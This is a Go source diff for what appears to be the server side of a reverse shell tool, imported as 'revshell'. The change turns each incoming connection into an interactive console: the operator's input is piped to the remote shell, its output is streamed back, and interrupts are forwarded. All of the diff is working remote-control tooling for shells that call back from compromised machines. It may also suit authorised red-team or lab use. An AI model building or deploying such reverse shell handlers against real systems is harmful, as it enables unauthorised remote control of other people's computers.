@@ -1,12 +1,17 @@
 package main
 
 import (
+	"errors"
 	"flag"
 	"fmt"
+	"io"
 	"log"
 	"net"
 	"os"
+	"os/signal"
 	"strings"
+	"sync"
+	"syscall"
 	"time"
 
 	"revshell/pkg/secureio"
@@ -45,7 +50,7 @@ func main() {
 			return
 		}
 
-		go handleConnection(conn, opts)
+		handleConnection(conn, opts)
 	}
 }
 
@@ -74,6 +79,17 @@ func parseFlags() serverOptions {
 	}
 }
 
+type lockedWriter struct {
+	mu sync.Mutex
+	w  io.Writer
+}
+
+func (l *lockedWriter) Write(p []byte) (int, error) {
+	l.mu.Lock()
+	defer l.mu.Unlock()
+	return l.w.Write(p)
+}
+
 func handleConnection(conn net.Conn, opts serverOptions) {
 	defer conn.Close()
 
@@ -91,16 +107,56 @@ func handleConnection(conn net.Conn, opts serverOptions) {
 		return
 	}
 
+	lw := &lockedWriter{w: writer}
 	sessionOpts := terminal.Options{Prompt: opts.prompt, Shell: opts.shell, InitialDir: opts.workdir}
-	session, err := terminal.NewSession(reader, writer, sessionOpts)
-	if err != nil {
-		log.Printf("server: failed to create session for %s: %v", conn.RemoteAddr(), err)
+	if err := terminal.SendOptions(lw, sessionOpts); err != nil {
+		log.Printf("server: failed to send session options to %s: %v", conn.RemoteAddr(), err)
 		return
 	}
 
-	if err := session.Run(); err != nil {
-		log.Printf("server: session for %s ended with error: %v", conn.RemoteAddr(), err)
-	} else {
-		log.Printf("server: session for %s closed", conn.RemoteAddr())
+	sigCh := make(chan os.Signal, 1)
+	stopForward := make(chan struct{})
+	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
+	defer func() {
+		signal.Stop(sigCh)
+		close(stopForward)
+	}()
+
+	go func() {
+		for {
+			select {
+			case <-stopForward:
+				return
+			case sig := <-sigCh:
+				if sig == nil {
+					continue
+				}
+				if _, err := lw.Write([]byte{3}); err != nil {
+					log.Printf("server: failed to forward interrupt to %s: %v", conn.RemoteAddr(), err)
+					return
+				}
+			}
+		}
+	}()
+
+	log.Printf("server: interactive session started with %s", conn.RemoteAddr())
+
+	done := make(chan struct{})
+	go func() {
+		defer close(done)
+		if _, err := io.Copy(os.Stdout, reader); err != nil && !errors.Is(err, io.EOF) {
+			log.Printf("server: read error from %s: %v", conn.RemoteAddr(), err)
+		}
+	}()
+
+	if _, err := io.Copy(lw, os.Stdin); err != nil && !errors.Is(err, io.EOF) && !errors.Is(err, os.ErrClosed) {
+		log.Printf("server: write error to %s: %v", conn.RemoteAddr(), err)
 	}
+
+	if tcpConn, ok := conn.(*net.TCPConn); ok {
+		_ = tcpConn.CloseWrite()
+	}
+
+	<-done
+	log.Printf("server: session for %s closed", conn.RemoteAddr())
 }
